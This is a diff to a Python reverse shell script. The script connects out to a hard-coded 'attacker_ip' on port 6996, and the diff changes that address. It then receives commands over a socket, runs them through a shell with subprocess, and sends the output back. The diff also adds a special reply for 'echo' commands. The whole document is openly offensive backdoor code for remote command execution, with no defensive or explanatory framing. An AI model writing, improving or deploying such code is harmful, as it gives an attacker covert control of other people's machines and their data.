@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-attacker_ip = '192.168.1.243'
+attacker_ip = '192.168.1.148'
 attacker_port = 6996
 
 def get_command():
@@ -11,9 +11,13 @@ def get_command():
         if command == 'q':
             break
         else:
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            result = proc.stdout.read() + proc.stderr.read()
-            sock.send(result)
+            if command[:4] == 'echo':
+                msg = "Echo command completed !"
+                sock.send(msg.encode())
+            else:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                sock.send(result)
 
 def connect_to_attacker():
     global sock
